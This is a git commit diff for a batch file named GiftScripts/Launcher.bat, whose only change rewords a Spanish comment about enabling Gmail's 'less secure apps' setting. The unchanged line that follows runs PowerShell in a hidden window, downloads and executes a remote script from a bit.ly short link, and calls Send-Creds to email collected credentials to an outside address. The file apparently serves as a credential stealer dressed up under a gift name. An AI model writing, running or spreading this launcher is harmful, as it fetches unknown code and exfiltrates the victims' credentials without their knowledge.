42e2a266b2c26de9556d4124a14666771017dab1
H3LL0WORLD <holamundoyt@gmail.com>
2016-10-22 21:13:08 -0500

    Update Launcher.bat

--- GiftScripts/Launcher.bat
+++ GiftScripts/Launcher.bat
@@ -1,2 +1,2 @@
-::En la cuenta desde donde se va a enviar el email ir a https://myaccount.google.com/security y configurar Permitir el acceso de aplicaciones menos seguras en SI.
+::En la cuenta desde donde se va a enviar el email ir a https://myaccount.google.com/security y configurar "Permitir el acceso de aplicaciones menos seguras" a "SI".
 Powershell -WindowStyle Hidden Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2eA6vFE'); Send-Creds -From 'correo@gmail.com' -Pass '!pass123' -To 'email@example.com'
